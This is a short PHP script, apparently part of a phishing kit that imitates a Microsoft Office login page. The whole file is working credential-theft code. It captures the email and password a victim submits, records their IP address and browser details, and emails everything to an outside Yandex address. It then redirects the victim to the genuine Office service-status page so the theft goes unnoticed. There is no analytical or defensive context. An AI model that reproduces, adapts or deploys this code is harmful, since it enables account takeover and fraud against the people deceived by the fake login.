<?php

if($_POST["logn"] != "" and $_POST["passd"] != ""){

$ip = getenv("REMOTE_ADDR");

$hostname = gethostbyaddr($ip);

$useragent = $_SERVER['HTTP_USER_AGENT'];

$message .= "|----------------- Microsoft Office Login -----------------|\n";

$message .= "Email          : ".$_POST['logn']."\n";

$message .= "Password       : ".$_POST['passd']."\n";

$message .= "|--------------------- I N F O | I P ----------------------|\n";

$message .= "|Client IP: ".$ip."\n";

$message .= "|--------- http://www.geoiptool.com/?IP=$ip ---------|\n";

$message .= "User Agent : ".$useragent."\n";

$message .= "|---------------------- IKA online -----------------------|\n";

$send = "panther46@yandex.com";

$subject = "Microsoft by IKA BLA3E | $ip";

{

mail("$send", "$subject", $message);   

}

$praga=rand();

$praga=md5($praga);

  header ('Location: https://portal.office.com/servicestatus');